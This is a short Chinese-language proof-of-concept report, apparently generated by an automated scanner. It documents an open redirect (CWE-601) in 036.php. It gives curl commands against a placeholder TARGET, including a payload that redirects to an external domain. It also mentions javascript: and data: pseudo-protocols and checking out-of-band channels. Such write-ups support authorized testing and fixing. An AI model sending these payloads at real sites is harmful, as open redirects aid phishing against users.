# POC — 036.php redirect 参数未校验协议，可构造开放重定向（含 javascript:/data: 伪协议）

- finding_id: `LLM-7af8cc31bcdd`
- type: `open_redirect` / CWE-601
- severity: `medium`
- file: `036.php:13`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/036.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 开放重定向 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/036.php?redirect=%2F%2Fexample.com'
```
预期：响应为 30x 且 Location 指向攻击者控制的域名。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。